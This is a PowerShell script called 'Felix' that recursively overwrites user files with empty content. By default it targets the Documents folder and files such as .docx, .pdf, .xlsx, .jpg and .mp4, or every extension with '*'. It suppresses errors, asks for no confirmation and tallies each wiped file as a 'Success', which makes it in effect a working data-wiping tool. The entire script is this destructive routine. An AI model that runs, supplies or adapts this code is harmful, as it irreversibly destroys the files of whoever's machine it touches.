$ErrorActionPreference = 'silentlycontinue'

function Write-Color($Text, $Color) {

    $TextColor = @{
        Object = $Text;
        ForegroundColor = $Color;
        NoNewline=$true
    }

    Write-Host @TextColor
}

Write-Host "`nHello Felix! -| v1.5 |- FireLies 2022" 
Write-Color "`nUsage:" -Color 'Cyan'; Write-Host " felix [-Extension] [-Path]`n`n"

function Felix {

    [CmdletBinding()]
    Param (

        [Parameter(Mandatory=$true)]
        [ValidateScript({

            $ExtSet = '.docx', '.doc', '.pdf', '.pptx', '.xlsx', '.xls', '.txt', '.mp4', '.mp3', '.jpg', '.jpeg', '.png', '*'

            if (($_ -notin $ExtSet) -or (!($_))) {
                Write-Host "`nPlease assign the extension parameter correctly `nValid extensions:" -NoNewline; Write-Host @Color " $($ExtSet -join ', ')"
                Write-Color "`nTIPS:" -Color 'Cyan'; Write-Host " --Use felix * to select all extensions `n      --Use separator (,) to assign more than 1`n"
                $false; exit
            }

            $true

        })]
        [string[]]$Extension,

        [Parameter(Mandatory=$false)]
        [string]$Path = "C:\Users\"+[Environment]::UserName+"\Documents"
    )

    ""
    if (!(Test-Path "$Path")) {
        Write-Host "$Path does not exist. Please check the name correctly`n" -ForegroundColor "Red"
        break
    }

    foreach ($Value in $Extension) {
        Write-Color "--Trying: $Value" -Color 'Cyan'; Write-Host " starting from $Path"

        
        foreach ($File in (Get-ChildItem "$Path\" -Recurse -Filter *$Value -Name)) {
            Out-Null | Out-File "$Path\$File" -Force

            if ((Get-Item "$Path\$File" | ForEach-Object {[int]($_.length /1kb)}) -eq 0) {
                Write-Color "O" -Color 'Green'; Write-Host " $Path\$File"
                $Success++
            } else {
                Write-Color "X" -Color 'Red'; Write-Host " $Path\$File"
                $Failed++
            }
        }

        ""
    }

    Write-Color "  Success: $Success  //  Failed: $Failed" -Color 'Cyan'; ""
    ""
}